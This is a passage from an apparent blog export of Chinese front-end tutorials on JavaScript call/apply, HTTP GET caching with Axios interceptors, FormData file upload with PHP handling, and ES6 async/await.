<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.food=<span class="string">"fish"</span>;</span><br><span class="line">&#125;</span><br><span class="line">Cat.prototype.say = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    alert(<span class="string">"I love "</span>+<span class="keyword">this</span>.food);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Dog</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.food=<span class="string">"bone"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> blackCat = <span class="keyword">new</span> Cat;</span><br><span class="line">blackCat.say();<span class="comment">//I love fish</span></span><br><span class="line"><span class="keyword">var</span> whiteDog = <span class="keyword">new</span> Dog();</span><br><span class="line"><span class="comment">//whiteDog 并没有定义say(),可使用apply或者call使whiteDog能够调用blackCat的say()</span></span><br><span class="line">blackCat.say.apply(whiteDog);<span class="comment">//I love bone</span></span><br></pre></td></tr></table></figure>
<h1 id="arguments"><a href="#arguments" class="headerlink" title="arguments"></a>arguments</h1><p>它是一个<strong>类数组</strong>，有length的属性和index下标，没有数组的方法。<br>关于类数组以及如何利用call()、apply()使用数组方法等，可以看之前的文章：<a href="http://blog.simmzl.cn/2017/08/做了动物的战争web小游戏之后的总结.html">做了动物的战争web小游戏之后的总结</a></p>
<h1 id="length-amp-name"><a href="#length-amp-name" class="headerlink" title="length &amp; name"></a>length &amp; name</h1><p>函数形参的数量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = <span class="function">(<span class="params">b, c, d</span>) =&gt;</span> <span class="built_in">console</span>.log(b);</span><br><span class="line">a.length; <span class="comment">// 3</span></span><br><span class="line">a.name; <span class="comment">// "a"</span></span><br></pre></td></tr></table></figure>
<h1 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a>prototype</h1><p>该函数的原型</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>蝴蝶书</tag>
      </tags>
  </entry>
  <entry>
    <title>关于动物的战争小游戏的总结</title>
    <url>/2017/08/%E5%85%B3%E4%BA%8E%E5%8A%A8%E7%89%A9%E7%9A%84%E6%88%98%E4%BA%89%E5%B0%8F%E6%B8%B8%E6%88%8F%E7%9A%84%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<p><strong><a href="http://simmzl.cn/games/chess.html" target="_blank" rel="noopener">DEMO预览</a></strong></p>
<blockquote>
<p>遇到的问题总结</p>
</blockquote>
<a id="more"></a>
<h3 id="1-HTML-5-新加入的全局属性-hidden"><a href="#1-HTML-5-新加入的全局属性-hidden" class="headerlink" title="1.HTML 5 新加入的全局属性 hidden"></a>1.HTML 5 新加入的全局属性 hidden</h3><p>可以直接在标签里设置hidden,兼容低版本方法：通过css属性选择器设置：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">*<span class="selector-attr">[hidden]</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>设置：hidden =”hidden”<br>也可通过js设置true or false改变；</p>
<h3 id="2-HTML-5-新加入的全局自定义属性-data"><a href="#2-HTML-5-新加入的全局自定义属性-data" class="headerlink" title="2.HTML 5 新加入的全局自定义属性 data-*"></a>2.HTML 5 新加入的全局自定义属性 data-*</h3><p>如在本项目中为方格设置data-index=”0”;<br>在js中获取：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    e.target.dataset.index;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-find-amp-filter"><a href="#3-find-amp-filter" class="headerlink" title="3.find() &amp; filter()"></a>3.find() &amp; filter()</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">arr.find(<span class="function"><span class="keyword">function</span>(<span class="params">currentValue,index,arr</span>), <span class="title">thisValue</span>)</span></span><br></pre></td></tr></table></figure>
<p>不会改变原数组的值，<br>作用为找到则返回第一个找到元素，否则返回undefined;!undefined = true;</p>
<p>js版本：ES6</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">array.filter(<span class="function"><span class="keyword">function</span>(<span class="params">currentValue,index,arr</span>), <span class="title">thisValue</span>)</span></span><br><span class="line">var ages = [32, 33, 16, 40];  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkAdult</span>(<span class="params">age</span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> age &gt;= <span class="number">18</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = ages.filter(checkAdult);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//32,33,40</span></span><br></pre></td></tr></table></figure>
<p>不会改变原数组的值，<br>作用为找到并返回所有元素，否则返回undefined;</p>
<p>js版本：1.6</p>
<h3 id="4-this"><a href="#4-this" class="headerlink" title="4.this"></a>4.this</h3><p>此处报错无法调用this.clickSquare,这个this指向Game,但在function中无法指向Game</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$squares.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">    t.addEventListener(<span class="string">'click'</span>, <span class="keyword">this</span>.clickSquare.bind(<span class="keyword">this</span>))</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>解决方法：在该function之外将 this.clickSquare.bind(this)定义为一个变量，再引用：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//解决forEach内无法用this</span></span><br><span class="line"><span class="keyword">var</span> onClickSquare = <span class="keyword">this</span>.clickSquare.bind(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">//遍历加入事件</span></span><br><span class="line">$squares.forEach(<span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">    t.addEventListener(<span class="string">'click'</span>, onClickSquare)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>或者定义this为一个变量，也是一个很好用的小技巧</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br></pre></td></tr></table></figure>
<h3 id="5-element-querySelector-CSS-选择器-amp-element-querySelectorAll-CSS-选择器"><a href="#5-element-querySelector-CSS-选择器-amp-element-querySelectorAll-CSS-选择器" class="headerlink" title="5.element.querySelector(CSS 选择器) &amp; element.querySelectorAll(CSS 选择器);"></a>5.element.querySelector(CSS 选择器) &amp; element.querySelectorAll(CSS 选择器);</h3><pre><code>element.querySelector(CSS 选择器)
</code></pre><p>匹配返回指定CSS选择器的第一个元素。如果没有找到，返回 null;</p>
<pre><code>element.querySelectorAll(CSS 选择器)
var all = element.querySelectorAll(CSS 选择器);
</code></pre><p>返回与指定的选择器组匹配的文档中的元素列表 <strong>返回的对象是NodeList，是对象object，也是类数组。</strong></p>
<p><strong>那么什么是类数组？</strong></p>
<p>即有数组的一些基本属性length、下标索引，其子元素可通过all.item(i)访问；但不完全是数组，如NodeList是DOM操作如getElementsByTagName()等取出来的为类数组；</p>
<p>他们也有自己的属性，例如item，另外NodeList最大的特点就是时效性（live）。与数组的区别以及时效性可以看下<a href="http://blog.csdn.net/u013853928/article/details/52856596" target="_blank" rel="noopener">详解</a>；</p>
<p>NodeList具有length，下标索引这些数组的属性特征，但是不可以使用数组的push、pop、shift、unshift等数组原生的方法，这时候需要将其转化为数组；<br>在该项目中，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> $squares = [].slice.call(<span class="built_in">document</span>.querySelectorAll(<span class="string">'.square'</span>));</span><br></pre></td></tr></table></figure>
<p>其中slice:arrayObj.slice(start, end),作用为截取数组arr中start—end部分返回新的数组，不写Start,end则默认全部；</p>
<p>其中 call([thisObj[,arg1[arg2[[argN]]]]]);</p>
<p>定义：调用一个对象的一个方法，以另一个对象替换当前对象。</p>
<p>说明：call 方法可以用来代替另一个对象调用一个方法。call 方法可将一个函数的对象上下文从初始的上下文改变为由 thisObj 指定的新对象。<br>很难懂……找到一个实例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>)  </span>&#123;</span><br><span class="line">      alert(a+b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">a,b</span>)  </span>&#123;</span><br><span class="line">      alert(a-b);</span><br><span class="line">&#125;</span><br><span class="line">add.call(sub,<span class="number">3</span>,<span class="number">1</span>);<span class="comment">//4</span></span><br><span class="line"><span class="comment">//这个例子意思就是用add来替换sub,使add能够调用sub的参数，add.call(sub,3,1) == add(3,1)，//注意：js中的函数其实是对象，函数名是对 Function 对象的引用。</span></span><br></pre></td></tr></table></figure>
<p>所以<code>[].slice.call(document.querySelectorAll(&#39;.square&#39;))</code>的意思是：</p>
<p><strong>用<code>call()</code>使<code>document.querySelectorAll(&#39;.square&#39;)</code>这个对象（类数组）的值能够通过数组方法slice()复制出来，存入<code>$squares</code>中</strong>；</p>
<p>（理解了半天才懂），也可以通过Array.prototype.slice.call(all)实现：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> $squares = <span class="built_in">Array</span>.prototype.slice.call(all)</span><br></pre></td></tr></table></figure>
<p>两篇不错的相关博客：<br><a href="http://www.cnblogs.com/dingxiaoyue/p/4948166.html" target="_blank" rel="noopener">详解</a><br><a href="http://uule.iteye.com/blog/1158829" target="_blank" rel="noopener">实例</a></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>html</tag>
        <tag>web游戏</tag>
      </tags>
  </entry>
  <entry>
    <title>关于IEGet只取缓存和Http304以及Axios拦截器配置</title>
    <url>/2018/07/%E5%85%B3%E4%BA%8EIEGet%E5%8F%AA%E5%8F%96%E7%BC%93%E5%AD%98%E5%92%8CHttp304%E4%BB%A5%E5%8F%8AAxios%E6%8B%A6%E6%88%AA%E5%99%A8%E9%85%8D%E7%BD%AE.html</url>
    <content><![CDATA[<h1 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h1><p>在IE 11中，页面更新数据之后重新获取列表数据时，列表并没有变化。查看Network显示刚才的请求200 OK,但是数据来自缓存(from memory cache)，响应正文依旧是之前没有变化的数据。<br>这个问题在Chrome上不存在。</p>
<h1 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h1><p>GET请求在URL和参数键值不变时，会默认读取浏览器中上一个此GET请求的响应，造成了该bug。<br>HTTP 缓存机制是web性能优化的重要手段,但这里更新数据并不需要缓存。<br><a id="more"></a></p>
<h1 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h1><p>最稳妥的方法是在get请求中添加时间戳，使每一个请求唯一。<br>添加Axios拦截器:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Axios.interceptors.request.use(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (config.method === <span class="string">"get"</span>) &#123;</span><br><span class="line">        <span class="comment">// 添加时间戳参数</span></span><br><span class="line">        config.params = &#123;</span><br><span class="line">            _t: +<span class="keyword">new</span> <span class="built_in">Date</span>(),</span><br><span class="line">            ...config.params</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 都可</span></span><br><span class="line">    <span class="comment">// config.headers["X-Requested-With"] = +new Date();</span></span><br><span class="line">    <span class="comment">// config.headers["Cache-Control"] = "no-cache";</span></span><br><span class="line">    <span class="comment">// config.headers["Pragma"] = "no-cache";</span></span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">&#125;, error =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h1 id="More"><a href="#More" class="headerlink" title="More"></a>More</h1><h2 id="Get与Post区别"><a href="#Get与Post区别" class="headerlink" title="Get与Post区别"></a>Get与Post区别</h2><p><strong>在缓存方面，Post是不会被浏览器缓存的</strong></p>
<table>
<thead>
<tr>
<th>区别</th>
<th>GET</th>
<th>POST</th>
</tr>
</thead>
<tbody>
<tr>
<td>缓存</td>
<td>能被缓存</td>
<td>不能被缓存</td>
</tr>
<tr>
<td>历史</td>
<td>参数保留在浏览器历史中</td>
<td>不会</td>
</tr>
<tr>
<td>编码类型</td>
<td>application/x-www-form-urlencoded</td>
<td>application/x-www-form-urlencoded 或 multipart/form-data。为二进制数据使用多重编码。</td>
</tr>
<tr>
<td>对数据长度的限制</td>
<td>URL 的最大长度是 2048 个字符</td>
<td>无限制</td>
</tr>
<tr>
<td>安全性</td>
<td>发送密码或其他敏感信息时不要使用</td>
<td>更安全，参数不会被保存在浏览器历史或 web 服务器日志中</td>
</tr>
</tbody>
</table>
<h2 id="Http-304-Not-Modified"><a href="#Http-304-Not-Modified" class="headerlink" title="Http 304 Not Modified"></a>Http 304 Not Modified</h2><h3 id="Last-Modified"><a href="#Last-Modified" class="headerlink" title="Last-Modified"></a>Last-Modified</h3><p>服务器在响应请求时，告诉浏览器资源的最后修改时间。<br><img src="http://static.simmzl.cn/last-modified.png" alt="Last-Modified"></p>
<h3 id="If-Modified-Since"><a href="#If-Modified-Since" class="headerlink" title="If-Modified-Since"></a>If-Modified-Since</h3><p>再次请求服务器时，浏览器通过此字段通知服务器上次请求时，服务器返回的资源最后修改时间,<br>服务器收到请求后发现有If-Modified-Since 则与被请求资源的最后修改时间进行比对。<br>若资源的最后修改时间大于晚于If-Modified-Since，说明资源又被改动过，则响应整片资源内容，返回状态码200；</p>
<p>若资源的最后修改时间早于等于If-Modified-Since，说明资源无新修改，则响应HTTP 304，告知浏览器继续使用所保存的cache。<br><img src="http://static.simmzl.cn/If-Modified-Since.png" alt="If-Modified-Since"></p>
<h2 id="Axios拦截器配置"><a href="#Axios拦截器配置" class="headerlink" title="Axios拦截器配置"></a>Axios拦截器配置</h2><p><strong>请求拦截器：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.interceptors.request.use(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 在发送请求之前做些什么</span></span><br><span class="line">    <span class="comment">// 添加header、对参数进行处理、配置并开启全局loading等等</span></span><br><span class="line">    <span class="keyword">return</span> config;</span><br><span class="line">  &#125;, error =&gt; &#123;</span><br><span class="line">    <span class="comment">// 对请求错误做些什么</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
<p><strong>响应拦截器：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">axios.interceptors.response.use(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 对响应数据做点什么</span></span><br><span class="line">    <span class="comment">// 可以通过接口返回的参数如responseCode等判断各种情况从而弹出提示、关闭全局Loading</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 例如 1000 表示未登录，则可以将路由push到login</span></span><br><span class="line">    <span class="keyword">if</span> (response.data.responseCode === <span class="string">"1000"</span>)  router.push(&#123; <span class="attr">name</span>: <span class="string">"login"</span> &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response.data; <span class="comment">// 直接返回data,而不必每次取data</span></span><br><span class="line">  &#125;, error =&gt; &#123;</span><br><span class="line">    <span class="comment">// 对响应错误做点什么</span></span><br><span class="line">    <span class="comment">// 可以通过接口返回的参数如responseCode等判断各种情况从而弹出提示、关闭全局Loading</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
<p>关于config的详细参数配置见：<a href="https://www.kancloud.cn/yunye/axios/234845" target="_blank" rel="noopener">Axios 中文说明 · 看云</a></p>
<h1 id="Last"><a href="#Last" class="headerlink" title="Last"></a>Last</h1><p>参考：<a href="https://www.cnblogs.com/chenqf/p/6386163.html" target="_blank" rel="noopener">彻底弄懂HTTP缓存机制及原理</a><br><a href="https://www.cnblogs.com/xuan52rock/p/4885282.html" target="_blank" rel="noopener">HTTP请求中浏览器的缓存机制</a><br><a href="http://www.w3school.com.cn/tags/html_ref_httpmethods.asp" target="_blank" rel="noopener">HTTP 方法：GET 对比 POST</a><br><a href="https://blog.csdn.net/xiaoping0915/article/details/79145234" target="_blank" rel="noopener">IE 浏览器 GET 请求缓存问题</a></p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>bug</tag>
        <tag>http/https</tag>
      </tags>
  </entry>
  <entry>
    <title>利用FormData对象实现AJAX文件上传功能及后端实现</title>
    <url>/2017/12/%E5%88%A9%E7%94%A8FormData%E5%AF%B9%E8%B1%A1%E5%AE%9E%E7%8E%B0AJAX%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8A%9F%E8%83%BD%E5%8F%8A%E5%90%8E%E7%AB%AF%E6%8E%A5%E6%94%B6.html</url>
    <content><![CDATA[<p><img src="http://static.simmzl.cn/blog/171221/4H45b80fG1.png?imageslim" alt="mark"><br>包括HTML基础设置、CSS界面优化、JS利用FormData对象和AJAX进行上传、后端接收文件并存储到指定路径以及删除文件操作。<br><a id="more"></a></p>
<h1 id="FE"><a href="#FE" class="headerlink" title="FE"></a>FE</h1><h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><p>基础的设置：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"file"</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">multiple</span>=<span class="string">"multiple"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">accept</span>=<span class="string">"..."</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="Form的enctype属性"><a href="#Form的enctype属性" class="headerlink" title="Form的enctype属性"></a>Form的enctype属性</h3><p>enctype这个属性管理的是表单的MIME编码，它一共有三个属性：</p>
<table>
<thead>
<tr>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>application/x-www-form-urlencoded</td>
<td>在发送前编码所有字符（默认）</td>
</tr>
<tr>
<td>multipart/form-data</td>
<td>不对字符编码，用来制定传输数据的特殊类型，如mp3、jpg</td>
</tr>
<tr>
<td>text/plain</td>
<td>纯文本传输</td>
</tr>
</tbody>
</table>
<p>因此，传输完整的文件数据需要<code>multipart/form-data</code>属性。</p>
<h3 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h3><h4 id="value"><a href="#value" class="headerlink" title="value"></a>value</h4><p>保存了用户指定的文件的名称。</p>
<h4 id="type-”file”"><a href="#type-”file”" class="headerlink" title="type=”file”"></a>type=”file”</h4><p>设置input类型为file。</p>
<h4 id="multiple-”multiple”"><a href="#multiple-”multiple”" class="headerlink" title="multiple=”multiple”"></a>multiple=”multiple”</h4><p>可多选，不设置为单选。</p>
<h4 id="accept-”…”"><a href="#accept-”…”" class="headerlink" title="accept=”…”"></a>accept=”…”</h4><p>设置可选文件的MIME_type。在设置之后点击选择文件按钮会默认显示符合设置的MIME_type的文件（存在兼容性）。具体的文件类型对应的MIME类型可以搜索到，这里列出我用到的类型：</p>
<table>
<thead>
<tr>
<th>文件类型</th>
<th>MIME类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>.txt</td>
<td>text/plain</td>
</tr>
<tr>
<td>.pdf</td>
<td>application/pdf</td>
</tr>
<tr>
<td>.doc</td>
<td>application/msword</td>
</tr>
<tr>
<td>.docx</td>
<td>application/vnd.openxmlformats-officedocument.wordprocessingml.document</td>
</tr>
<tr>
<td>.xls</td>
<td>application/vnd.ms-excel</td>
</tr>
<tr>
<td>.ppt</td>
<td>application/vnd.ms-powerpoint</td>
</tr>
<tr>
<td>.pptx</td>
<td>application/vnd.openxmlformats-officedocument.presentationml.presentation</td>
</tr>
</tbody>
</table>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="http://static.simmzl.cn/blog/171220/fh120IGA0F.png?imageslim" alt="mark"></p>
<p>太丑，不能忍…</p>
<h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><p>默认界面会在选择文件按钮后会跟一个显示文件名的文本区域，选择文件按钮无法编辑。<br>我修改的方法是将input框隐藏，再设置一个lable标签使用户点击lable标签时触发选择文件按钮。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>选择文件<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="效果-1"><a href="#效果-1" class="headerlink" title="效果"></a>效果</h3><p><img src="http://static.simmzl.cn/blog/171221/4H45b80fG1.png?imageslim" alt="mark"></p>
<h2 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h2><p>在使用from提交时，浏览器会向服务器发送选中的文件的内容而不仅仅是发送文件名。</p>
<blockquote>
<p>为安全起见，<code>&lt;input type=&quot;file&quot;&gt;</code>即file-upload 元素不允许 HTML 作者或 JavaScript 程序员指定一个默认的文件名。HTML value 属性被忽略，并且对于此类元素来说，value属性是只读的，这意味着只有用户可以输入一个文件名。当用户选择或编辑一个文件名时，file-upload 元素触发 onchange 事件句柄。</p>
</blockquote>
<p>利用form提交会导致页面刷新，体验不好，所以使用AJAX进行文件上传是个不错的选择。但这需要我们自己来组织通过POST请求发送的内容。</p>
<h3 id="FormData对象"><a href="#FormData对象" class="headerlink" title="FormData对象"></a>FormData对象</h3><blockquote>
<p>通过FormData对象可以组装一组用 XMLHttpRequest发送请求的键/值对。它可以更灵活方便的发送表单数据，因为可以独立于表单使用。如果你把表单的编码类型设置为multipart/form-data ，则通过FormData传输的数据格式和表单通过submit() 方法传输的数据格式相同。<br>—— MDN web docs</p>
</blockquote>
<h4 id="创建FormData对象"><a href="#创建FormData对象" class="headerlink" title="创建FormData对象"></a>创建FormData对象</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> formData = <span class="keyword">new</span> FormData();</span><br></pre></td></tr></table></figure>
<h4 id="向实例化对象中添加文件字段"><a href="#向实例化对象中添加文件字段" class="headerlink" title="向实例化对象中添加文件字段"></a>向实例化对象中添加文件字段</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> myFile = <span class="built_in">document</span>.getElementById(<span class="string">'file'</span>);</span><br><span class="line"><span class="comment">// myFile.file[0]为第一个文件（单选）,多个文件（多选）则要循环添加</span></span><br><span class="line">formData.append(<span class="string">'myFile'</span>, myFile.files[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(myFile.files[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<p><img src="http://static.simmzl.cn/blog/171221/6ajifkcLgC.png?imageslim" alt="mark"></p>
<p>其中size属性单位是byte（字节），即b。</p>
<h4 id="添加自定义字段"><a href="#添加自定义字段" class="headerlink" title="添加自定义字段"></a>添加自定义字段</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">formData.append(<span class="string">'username'</span>, <span class="string">'simmzl'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="AJAX发送"><a href="#AJAX发送" class="headerlink" title="AJAX发送"></a>AJAX发送</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> request = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">request.open(<span class="string">"POST"</span>, <span class="string">"http://foo.com/foo.php"</span>);</span><br><span class="line">request.send(formData);</span><br></pre></td></tr></table></figure>
<h3 id="不使用FromData对象"><a href="#不使用FromData对象" class="headerlink" title="不使用FromData对象"></a>不使用FromData对象</h3><p>不使用FormData对象的情况下，需要通过AJAX序列化和提交表单 ：<br><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest#Submitting_forms_and_uploading_files" target="_blank" rel="noopener">Using nothing but XMLHttpRequest</a></p>
<h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="接收"><a href="#接收" class="headerlink" title="接收"></a>接收</h2><p>全局数组 <code>$_FILES</code>，第一个参数是表单的 input name，第二个下标是 “name”, “type”, “size”, “tmp_name” 或 “error”。可以根据这些属性做相关限制，如<strong>限制文件大小、文件类型等</strong>。</p>
<table>
<thead>
<tr>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>name</td>
<td>文件名</td>
</tr>
<tr>
<td>type</td>
<td>文件的MIME类型</td>
</tr>
<tr>
<td>size</td>
<td>以字节Byte为单位的文件大小</td>
</tr>
<tr>
<td>tmp_name</td>
<td>PHP接收文件会存为暂时文件，如需保存到指定路径还要移动这个暂时文件才可以</td>
</tr>
<tr>
<td>error</td>
<td><code>1-7</code>代表7种不同错误类别以及<code>0</code>代表成功</td>
</tr>
</tbody>
</table>
<p><strong>error：</strong><br>成功：0(UPLOAD_ERR_OK)<br>失败：</p>
<ol>
<li>超过了配置文件上传文件的大小</li>
<li>超过了表单设置上传文件的大小</li>
<li>文件部分被上传</li>
<li>没有文件被上传</li>
<li>没有找到临时目录</li>
<li>文件不可写</li>
<li>由于PHP的扩展程序中断了文件上传</li>
</ol>
<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>上传文件是通过POST发送的，<code>is_uploaded_file(file)</code>函数可以判断指定的文件是否是通过 HTTP POST 上传的，返回布尔值。</p>
<blockquote>
<p>该函数可以用于确保恶意的用户无法欺骗脚本去访问本不能访问的文件，例如 /etc/passwd。<br>这种检查显得格外重要，如果上传的文件有可能会造成对用户或本系统的其他用户显示其内容的话。</p>
</blockquote>
<h2 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h2><p>上传的文件暂存在tmp_name中，需要使用<code>move_uploaded_file(file,newlocation)</code>将上传的文件移动到指定路径，返回布尔值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( move_uploaded_file($tmp_name, $destination) ) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"文件上传成功"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"文件移动失败"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>使用<code>unlink(filepath)</code>删除文件，参数是文件路径。</p>
<h2 id="拓展功能"><a href="#拓展功能" class="headerlink" title="拓展功能"></a>拓展功能</h2><p>当然除了接收、验证、保存和删除这四个基本操作外，还可以添加诸如将文件路径存入数据库、生成文件列表等功能，视需求而定。</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>php</tag>
        <tag>ajax</tag>
      </tags>
  </entry>
  <entry>
    <title>吃了这口ES6/7语法糖</title>
    <url>/2018/03/%E5%90%83%E4%BA%86%E8%BF%99%E5%8F%A3ES67%E8%AF%AD%E6%B3%95%E7%B3%96.html</url>
    <content><![CDATA[<p>ES6/7的新语法还是挺多的，实际工作中几乎都用新的语法糖。<br><a id="more"></a></p>
<h1 id="Async-Await"><a href="#Async-Await" class="headerlink" title="Async/Await"></a>Async/Await</h1><h2 id="Async"><a href="#Async" class="headerlink" title="Async"></a>Async</h2><p>Async function 异步函数，返回一个promis对象；<br>声明异步函数：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"><span class="keyword">const</span> foo = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">const</span> foo = <span class="keyword">async</span> () =&gt; &#123;&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="await"><a href="#await" class="headerlink" title="await"></a>await</h2><p>await（只允许在 async(异步) 函数内部使用，等待其操作的对象 Promise 返回;</p>
<ul>
<li>如果 Promise 是完成状态，才会继续往下执行。</li>
<li>如果 Promise 是拒绝状态，await 会抛出拒绝值，不再往下执行。</li>
</ul>
<p>使用async function的原因就是为了在其中使用await,而await之后跟的是表达式，可以是函数（异步函数或者其他普通函数）或者其他表达式。</p>
